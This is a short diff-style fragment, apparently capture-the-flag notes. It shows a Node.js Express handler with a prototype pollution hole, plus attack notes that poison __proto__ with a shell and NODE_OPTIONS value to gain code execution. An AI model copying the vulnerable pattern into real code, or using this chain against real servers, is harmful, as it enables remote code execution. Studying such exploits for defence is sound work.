@@ -1,0 +1,23 @@
+app.put('/api/directory*', (req, res) => {
+    let path = decodeURIComponent(req.path.substring('/api/directory'.length));
+    if (!path.startsWith('/')) {
+        return res.status(404).send('no.');
+    }
+
+    let parentPath = path.split('/').reverse().slice(1).reverse().join('/');
+    let id = path.replace(parentPath + '/', '');
+    let { value } = req.body;
+    find(parentPath)[id] = value;
+
+    res.send('ok');
+});
+
+=>
+find('__proto__')['shell']='node'
+find('__proto__')['env']
+	NODE_OPTIONS: --require /proc/self/environ
+
+
+cwd and ps.js to prevent error (node -c ps.js)
+
+use eval to get the answer
